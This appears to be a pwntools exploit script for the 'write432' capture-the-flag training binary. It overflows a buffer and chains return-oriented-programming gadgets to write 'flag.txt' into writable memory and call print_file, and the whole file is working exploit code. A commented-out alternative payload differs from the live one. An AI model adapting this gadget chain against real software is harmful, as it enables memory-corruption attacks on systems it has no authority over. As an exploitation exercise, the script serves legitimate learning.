from pwn import *

target = process("./write432")

pop_call = 0x080485aa
print_file = 0x80483d0
move_gadget = 0x08048543
data_adr = 0x0804a018
offset = 44

payload = flat(
    'a' * offset,  
    pop_call,  
    data_adr, 
    'flag',  
    move_gadget, 

    
    pop_call,  
    data_adr + 0x4,  
    '.txt', 
    move_gadget,

    print_file, 
    0x0,
    data_adr
)


# payload = b"a"*offset + p32(pop_call) + p32(data_adr) + b"flag" + p32(move_gadget) + p32(pop_call) + p32(data_adr) + b"b"*4 + b".txt" + p32(move_gadget) + p32(print_file) + p32(0x0) + p32(data_adr)

target.sendline(payload)
target.interactive()
